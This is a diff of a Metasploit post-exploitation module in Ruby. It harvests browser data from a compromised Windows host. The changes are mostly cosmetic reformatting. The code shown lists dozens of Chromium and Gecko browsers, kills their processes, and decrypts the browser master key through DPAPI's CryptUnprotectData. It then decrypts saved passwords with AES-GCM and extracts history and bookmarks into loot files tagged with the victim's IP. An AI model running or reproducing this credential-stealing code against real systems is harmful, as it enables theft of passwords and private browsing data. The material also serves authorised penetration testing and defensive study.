@@ -63,31 +63,45 @@ class MetasploitModule < Msf::Post
   # Browsers and paths taken from https://github.com/shaddy43/BrowserSnatch/
   def process_chromium_browsers(base_path)
     chromium_browsers = {
-      'Microsoft\\Edge\\' => 'Microsoft Edge', 'Google\\Chrome\\' => 'Google Chrome', 'Opera Software\\Opera Stable' => 'Opera',
-      'Iridium\\' => 'Iridium', 'Chromium\\' => 'Chromium', 'BraveSoftware\\Brave-Browser\\' => 'Brave',
-      'CentBrowser\\' => 'CentBrowser', 'Chedot\\' => 'Chedot', 'Orbitum\\' => 'Orbitum',
-      'Comodo\\Dragon\\' => 'Comodo Dragon', 'Yandex\\YandexBrowser\\' => 'Yandex Browser', '7Star\\7Star\\' => '7Star',
-      'Torch\\' => 'Torch', 'MapleStudio\\ChromePlus\\' => 'ChromePlus', 'Kometo\\' => 'Komet',
-      'Amigo\\' => 'Amigo', 'Sputnik\\Sputnik\\' => 'Sputnik', 'CatalinaGroup\\Citrio\\' => 'Citrio',
-      '360Chrome\\Chrome\\' => '360Chrome', 'uCozMedia\\Uran\\' => 'Uran', 'liebao\\' => 'Liebao',
-      'Elements Browser\\' => 'Elements Browser', 'Epic Privacy Browser\\' => 'Epic Privacy Browser',
-      'CocCoc\\Browser\\' => 'CocCoc Browser', 'Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer' => 'Sleipnir',
-      'QIP Surf\\' => 'QIP Surf', 'Coowon\\Coowon\\' => 'Coowon', 'Vivaldi\\' => 'Vivaldi'
+      'Microsoft\\Edge\\' => 'Microsoft Edge',
+      'Google\\Chrome\\' => 'Google Chrome',
+      'Opera Software\\Opera Stable' => 'Opera',
+      'Iridium\\' => 'Iridium',
+      'Chromium\\' => 'Chromium',
+      'BraveSoftware\\Brave-Browser\\' => 'Brave',
+      'CentBrowser\\' => 'CentBrowser',
+      'Chedot\\' => 'Chedot',
+      'Orbitum\\' => 'Orbitum',
+      'Comodo\\Dragon\\' => 'Comodo Dragon',
+      'Yandex\\YandexBrowser\\' => 'Yandex Browser',
+      '7Star\\7Star\\' => '7Star',
+      'Torch\\' => 'Torch',
+      'MapleStudio\\ChromePlus\\' => 'ChromePlus',
+      'Kometo\\' => 'Komet',
+      'Amigo\\' => 'Amigo',
+      'Sputnik\\Sputnik\\' => 'Sputnik',
+      'CatalinaGroup\\Citrio\\' => 'Citrio',
+      '360Chrome\\Chrome\\' => '360Chrome',
+      'uCozMedia\\Uran\\' => 'Uran',
+      'liebao\\' => 'Liebao',
+      'Elements Browser\\' => 'Elements Browser',
+      'Epic Privacy Browser\\' => 'Epic Privacy Browser',
+      'CocCoc\\Browser\\' => 'CocCoc Browser',
+      'Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer' => 'Sleipnir',
+      'QIP Surf\\' => 'QIP Surf',
+      'Coowon\\Coowon\\' => 'Coowon',
+      'Vivaldi\\' => 'Vivaldi'
     }
 
     chromium_browsers.each do |path, name|
       profile_path = "#{base_path}\\AppData\\Local\\#{path}\\User Data\\Default"
-
       next unless directory?(profile_path)
 
       print_status("Found #{name}")
-      if datastore['KILL_BROWSER'] == true
-        kill_browser_process(name)
-      end
+      kill_browser_process(name) if datastore['KILL_BROWSER']
 
       local_state = "#{base_path}\\AppData\\Local\\#{path}\\User Data\\Local State"
       encryption_key = get_encryption_key(local_state)
-
       extract_chromium_data(profile_path, encryption_key, name)
     end
   end
@@ -95,23 +109,26 @@ class MetasploitModule < Msf::Post
   # Browsers and paths taken from https://github.com/shaddy43/BrowserSnatch/
   def process_gecko_browsers(base_path)
     gecko_browsers = {
-      'Mozilla\\Firefox\\' => 'Mozilla Firefox', 'Thunderbird\\' => 'Thunderbird',
-      'Mozilla\\SeaMonkey\\' => 'SeaMonkey', 'NETGATE Technologies\\BlackHawk\\' => 'BlackHawk',
-      '8pecxstudios\\Cyberfox\\' => 'Cyberfox', 'K-Meleon\\' => 'K-Meleon',
-      'Mozilla\\icecat\\' => 'Icecat', 'Moonchild Productions\\Pale Moon\\' => 'Pale Moon',
-      'Comodo\\IceDragon\\' => 'Comodo IceDragon', 'Waterfox\\' => 'Waterfox', 'Postbox\\' => 'Postbox',
+      'Mozilla\\Firefox\\' => 'Mozilla Firefox',
+      'Thunderbird\\' => 'Thunderbird',
+      'Mozilla\\SeaMonkey\\' => 'SeaMonkey',
+      'NETGATE Technologies\\BlackHawk\\' => 'BlackHawk',
+      '8pecxstudios\\Cyberfox\\' => 'Cyberfox',
+      'K-Meleon\\' => 'K-Meleon',
+      'Mozilla\\icecat\\' => 'Icecat',
+      'Moonchild Productions\\Pale Moon\\' => 'Pale Moon',
+      'Comodo\\IceDragon\\' => 'Comodo IceDragon',
+      'Waterfox\\' => 'Waterfox',
+      'Postbox\\' => 'Postbox',
       'Flock\\Browser\\' => 'Flock Browser'
     }
 
     gecko_browsers.each do |path, name|
       profile_path = "#{base_path}\\AppData\\Roaming\\#{path}\\Profiles"
-
       next unless directory?(profile_path)
 
       print_status("Found #{name}")
-      if datastore['KILL_BROWSER'] == true
-        kill_browser_process(name)
-      end
+      kill_browser_process(name) if datastore['KILL_BROWSER']
 
       session.fs.dir.entries(profile_path).each do |profile|
         next if profile == '.' || profile == '..'
@@ -123,20 +140,38 @@ class MetasploitModule < Msf::Post
 
   def kill_browser_process(browser)
     browser_process_names = {
-      'Microsoft Edge' => 'msedge.exe', 'Google Chrome' => 'chrome.exe', 'Opera' => 'opera.exe',
-      'Iridium' => 'iridium.exe', 'Chromium' => 'chromium.exe', 'Brave' => 'brave.exe',
-      'CentBrowser' => 'centbrowser.exe', 'Chedot' => 'chedot.exe', 'Orbitum' => 'orbitum.exe',
-      'Comodo Dragon' => 'dragon.exe', 'Yandex Browser' => 'browser.exe', '7Star' => '7star.exe',
-      'Torch' => 'torch.exe', 'ChromePlus' => 'chromeplus.exe', 'Komet' => 'komet.exe',
-      'Amigo' => 'amigo.exe', 'Sputnik' => 'sputnik.exe', 'Citrio' => 'citrio.exe',
-      '360Chrome' => '360chrome.exe', 'Uran' => 'uran.exe', 'Liebao' => 'liebao.exe',
-      'Elements Browser' => 'elementsbrowser.exe', 'Epic Privacy Browser' => 'epic.exe',
-      'CocCoc Browser' => 'browser.exe', 'Sleipnir' => 'sleipnir.exe', 'QIP Surf' => 'qipsurf.exe',
-      'Coowon' => 'coowon.exe', 'Vivaldi' => 'vivaldi.exe'
+      'Microsoft Edge' => 'msedge.exe',
+      'Google Chrome' => 'chrome.exe',
+      'Opera' => 'opera.exe',
+      'Iridium' => 'iridium.exe',
+      'Chromium' => 'chromium.exe',
+      'Brave' => 'brave.exe',
+      'CentBrowser' => 'centbrowser.exe',
+      'Chedot' => 'chedot.exe',
+      'Orbitum' => 'orbitum.exe',
+      'Comodo Dragon' => 'dragon.exe',
+      'Yandex Browser' => 'browser.exe',
+      '7Star' => '7star.exe',
+      'Torch' => 'torch.exe',
+      'ChromePlus' => 'chromeplus.exe',
+      'Komet' => 'komet.exe',
+      'Amigo' => 'amigo.exe',
+      'Sputnik' => 'sputnik.exe',
+      'Citrio' => 'citrio.exe',
+      '360Chrome' => '360chrome.exe',
+      'Uran' => 'uran.exe',
+      'Liebao' => 'liebao.exe',
+      'Elements Browser' =>
+      'elementsbrowser.exe',
+      'Epic Privacy Browser' => 'epic.exe',
+      'CocCoc Browser' => 'browser.exe',
+      'Sleipnir' => 'sleipnir.exe',
+      'QIP Surf' => 'qipsurf.exe',
+      'Coowon' => 'coowon.exe',
+      'Vivaldi' => 'vivaldi.exe'
     }
 
     process_name = browser_process_names[browser]
-
     return unless process_name
 
     session.sys.process.get_processes.each do |process|
@@ -154,7 +189,6 @@ class MetasploitModule < Msf::Post
 
   def decrypt_data(encrypted_data)
     print_status('Starting DPAPI decryption process.') if datastore['VERBOSE']
-
     begin
       mem = session.railgun.kernel32.LocalAlloc(0, encrypted_data.length)['return']
       raise 'Memory allocation failed.' if mem == 0
@@ -170,17 +204,14 @@ class MetasploitModule < Msf::Post
       end
 
       pdatain = [encrypted_data.length, mem].pack(inout_fmt)
-
       ret = session.railgun.crypt32.CryptUnprotectData(
         pdatain, nil, nil, nil, nil, 0, 2048
       )
-
       len, addr = ret['pDataOut'].unpack(inout_fmt)
       decrypted_data = len == 0 ? nil : session.railgun.memread(addr, len)
 
       session.railgun.kernel32.LocalFree(mem)
       session.railgun.kernel32.LocalFree(addr) if addr != 0
-
       print_good('Decryption successful.') if datastore['VERBOSE']
       return decrypted_data.strip
     rescue StandardError => e
@@ -191,7 +222,6 @@ class MetasploitModule < Msf::Post
 
   def get_encryption_key(local_state_path)
     print_status("Getting encryption key from: #{local_state_path}") if datastore['VERBOSE']
-
     if file?(local_state_path)
       local_state = read_file(local_state_path)
       json_state = begin
@@ -199,7 +229,6 @@ class MetasploitModule < Msf::Post
       rescue StandardError
         nil
       end
-
       if json_state.nil?
         print_error('Failed to parse JSON from Local State file.')
         return nil
@@ -212,19 +241,16 @@ class MetasploitModule < Msf::Post
         rescue StandardError
           nil
         end
-
         if encrypted_key_bin.nil?
           print_error('Failed to Base64 decode the encrypted key.')
           return nil
         end
 
         print_status("Encrypted key (Base64-decoded, hex): #{encrypted_key_bin.unpack('H*').first}") if datastore['VERBOSE']
-
         decrypted_key = decrypt_data(encrypted_key_bin)
 
         if decrypted_key.nil? || decrypted_key.length != 32
           print_error("Decrypted key is not 32 bytes: #{decrypted_key.nil? ? 'nil' : decrypted_key.length} bytes") if datastore['VERBOSE']
-
           if decrypted_key.length == 31
             print_status('Decrypted key is 31 bytes, attempting to pad key for decryption.') if datastore['VERBOSE']
             decrypted_key += "\x00"
@@ -232,7 +258,6 @@ class MetasploitModule < Msf::Post
             return nil
           end
         end
-
         print_good("Decrypted key (hex): #{decrypted_key.unpack('H*').first}") if datastore['VERBOSE']
         return decrypted_key
       else
@@ -270,7 +295,6 @@ class MetasploitModule < Msf::Post
       aes.key = key
       aes.iv = iv
       aes.auth_tag = tag
-
       decrypted_password = aes.update(ciphertext) + aes.final
       return decrypted_password
     rescue OpenSSL::Cipher::CipherError
@@ -303,7 +327,6 @@ class MetasploitModule < Msf::Post
     end
 
     extract_sql_data("#{profile_path}\\History", 'SELECT url, title, visit_count, last_visit_time FROM urls', 'history', browser)
-
     extract_json_bookmarks("#{profile_path}\\Bookmarks", 'bookmarks', browser)
   end
 
@@ -320,7 +343,6 @@ class MetasploitModule < Msf::Post
       bookmarks_json = JSON.parse(bookmarks_data)
 
       bookmarks = []
-
       if bookmarks_json['roots']['bookmark_bar']
         traverse_bookmarks(bookmarks_json['roots']['bookmark_bar'], bookmarks)
       end
@@ -335,13 +357,9 @@ class MetasploitModule < Msf::Post
       if bookmarks.any?
         bookmark_entries = bookmarks.map { |bookmark| "#{bookmark[:name]}: #{bookmark[:url]}" }.join("\n")
         file_name = store_loot("#{browser_clean}_#{data_type}", 'text/plain', session, bookmark_entries, "#{timestamp}_#{ip}_#{browser_clean}_#{data_type}.txt", "#{browser_clean} #{data_type.capitalize}")
-
         file_size = ::File.size(file_name)
-
         print_good("└ Extracted #{data_type.capitalize} to #{file_name} (#{file_size} bytes)")
       end
-    else
-      print_error("Bookmarks file not found at #{bookmarks_path}")
     end
   end
 
@@ -382,9 +400,7 @@ class MetasploitModule < Msf::Post
         timestamp = Time.now.strftime('%Y%m%d%H%M')
         ip = session.sock.peerhost
         file_name = store_loot("#{browser_clean}_#{data_type}", 'text/plain', session, result, "#{timestamp}_#{ip}_#{browser_clean}_#{data_type}.txt", "#{browser_clean} #{data_type.capitalize}")
-
         file_size = ::File.size(file_name)
-
         print_good("└ Extracted #{data_type.capitalize} to #{file_name} (#{file_size} bytes)")
       ensure
         db.close
@@ -396,16 +412,12 @@ class MetasploitModule < Msf::Post
   def extract_json_data(json_path, data_type, browser)
     if file?(json_path)
       json_data = read_file(json_path)
-
       browser_clean = browser.gsub('\\', '_').chomp('_')
       timestamp = Time.now.strftime('%Y%m%d%H%M')
       ip = session.sock.peerhost
       file_name = store_loot("#{browser_clean}_#{data_type}", 'application/json', session, json_data, "#{timestamp}_#{ip}_#{browser_clean}_#{data_type}.json", "#{browser_clean} #{data_type.capitalize}")
-
       file_size = ::File.size(file_name)
-
       print_good("└ Extracted #{data_type.capitalize} to #{file_name} (#{file_size} bytes)")
     end
   end
-
 end
